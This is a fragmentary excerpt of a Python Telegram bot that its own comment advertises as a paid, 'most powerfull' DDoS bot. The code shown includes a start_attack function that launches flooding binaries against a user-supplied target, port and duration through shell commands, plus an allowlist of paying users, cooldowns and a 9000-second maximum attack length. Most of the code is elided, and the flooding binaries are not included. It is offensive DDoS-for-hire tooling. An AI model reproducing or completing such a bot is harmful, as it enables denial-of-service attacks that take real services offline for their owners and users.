...
USER_COOLDOWN = 1  # Cooldown time for normal users in seconds
...
# SCRIPT MADE BY venom ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
                ...
                response = f"User added successfully."
            else:
...
def start_attack(user_id, target, port, duration):
    ...
    try:
        ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 100", shell=True)
        time.sleep(5)
        subprocess.run(f"./{venom_file} {target} {port} {duration} 100", shell=True)
...
def handle_attack_details(message):
    ...
    if user_id in allowed_user_ids:
        try:
            ...
            MAX_DURATION = 9000  # Set maximum duration (in seconds) for Normal users
